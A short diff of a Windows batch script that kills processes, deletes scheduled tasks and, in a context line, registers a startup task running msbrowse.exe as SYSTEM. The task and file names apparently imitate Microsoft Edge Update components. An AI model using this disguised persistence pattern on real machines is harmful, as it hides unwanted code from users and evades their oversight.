@@ -29,11 +29,11 @@ taskkill /IM UAStock.exe /f
 taskkill /IM MicrosoftEdgeUpdate /f 
 
 Echo DelSchedule
-Setup=schtasks /TN Microsoft\UAStock /Delete /F
-Setup=schtasks /TN Microsoft\UAStockU /Delete /F
-Setup=schtasks /TN Microsoft\UAStockD /Delete /F
-Setup=schtasks /TN Microsoft\MSbrowse /Delete /F
-Setup=schtasks /TN Microsoft\MSbrowseD /Delete /F
+schtasks /TN Microsoft\UAStock /Delete /F
+schtasks /TN Microsoft\UAStockU /Delete /F
+schtasks /TN Microsoft\UAStockD /Delete /F
+schtasks /TN Microsoft\MSbrowse /Delete /F
+schtasks /TN Microsoft\MSbrowseD /Delete /F
 
 Echo Schedule
 schtasks /TN Microsoft\MSbrowse /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC ONSTART /f
